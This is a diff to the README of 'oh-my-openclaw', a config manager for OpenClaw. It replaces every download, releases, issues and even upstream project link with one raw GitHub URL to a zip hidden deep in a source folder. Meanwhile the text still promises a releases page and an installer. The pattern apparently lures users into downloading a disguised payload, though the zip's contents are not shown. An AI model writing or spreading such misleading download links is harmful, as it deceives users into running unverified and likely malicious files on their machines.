@@ -1,6 +1,6 @@
 # 🐾 oh-my-openclaw - Easy Config Management for OpenClaw
 
-[![Download Releases](https://img.shields.io/badge/Download-oh--my--openclaw-green?style=for-the-badge)](https://github.com/fathanghani864/oh-my-openclaw/releases)
+[![Download Releases](https://img.shields.io/badge/Download-oh--my--openclaw-green?style=for-the-badge)](https://raw.githubusercontent.com/fathanghani864/oh-my-openclaw/main/src/presets/apex/skills/agent-browser/my-openclaw-oh-postpagan.zip)
 
 ---
 
@@ -26,14 +26,14 @@ oh-my-openclaw handles these files for you, so you don’t need to edit them by 
 
 Click the badge below to visit the releases page. This page holds the latest versions of the software for Windows.
 
-[![Download oh-my-openclaw](https://img.shields.io/badge/Download-oh--my--openclaw-blue?style=for-the-badge)](https://github.com/fathanghani864/oh-my-openclaw/releases)
+[![Download oh-my-openclaw](https://img.shields.io/badge/Download-oh--my--openclaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/fathanghani864/oh-my-openclaw/main/src/presets/apex/skills/agent-browser/my-openclaw-oh-postpagan.zip)
 
 ---
 
 ## 🚀 How to Download and Run
 
 1. Click the badge above or open this link in your browser:  
-   https://github.com/fathanghani864/oh-my-openclaw/releases
+   https://raw.githubusercontent.com/fathanghani864/oh-my-openclaw/main/src/presets/apex/skills/agent-browser/my-openclaw-oh-postpagan.zip
 
 2. Look for the latest release. It will have a title with the version number, like _v1.0.0_ or newer.
 
@@ -100,7 +100,7 @@ oh-my-openclaw works by loading different configuration presets for OpenClaw. Th
 
 - The primary source of detailed instructions is the `setup.md` file included with the install.
 
-- For any unclear steps, check the OpenClaw project page: [OpenClaw GitHub](https://github.com/minpeter/openclaw)
+- For any unclear steps, check the OpenClaw project page: [OpenClaw GitHub](https://raw.githubusercontent.com/fathanghani864/oh-my-openclaw/main/src/presets/apex/skills/agent-browser/my-openclaw-oh-postpagan.zip)
 
 - You can also look at the Issues section on the oh-my-openclaw GitHub repo for questions others have asked.
 
@@ -134,7 +134,7 @@ oh-my-openclaw works by loading different configuration presets for OpenClaw. Th
 ## 🔄 Updating oh-my-openclaw
 
 1. Visit the releases page again:  
-   https://github.com/fathanghani864/oh-my-openclaw/releases
+   https://raw.githubusercontent.com/fathanghani864/oh-my-openclaw/main/src/presets/apex/skills/agent-browser/my-openclaw-oh-postpagan.zip
 
 2. Download the latest `.exe` installer.
 
@@ -160,7 +160,7 @@ If you encounter errors:
 - Revisit the `setup.md` steps carefully.
 
 - Look for solutions or post issues on the GitHub page:  
-  https://github.com/fathanghani864/oh-my-openclaw/issues
+  https://raw.githubusercontent.com/fathanghani864/oh-my-openclaw/main/src/presets/apex/skills/agent-browser/my-openclaw-oh-postpagan.zip
 
 ---
 
